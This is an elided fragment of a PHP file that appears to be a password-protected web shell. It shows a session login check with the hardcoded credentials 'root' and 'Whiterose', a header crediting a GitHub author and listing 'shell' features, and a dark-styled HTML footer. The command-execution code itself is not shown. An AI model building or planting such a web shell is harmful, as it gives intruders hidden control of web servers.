...
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        ...
        if ($username == 'root' && $password == 'Whiterose') {
...
<?php
          ...
          /**
            * Code By : https://github.com/Tituss22
            * Fitur shell:
...
<body class="bg-dark text-light">
	...
	<div class="bg-dark border text-center mt-2"><small>Copyright &copy; 2022 - Code By Whiterose</small></div>
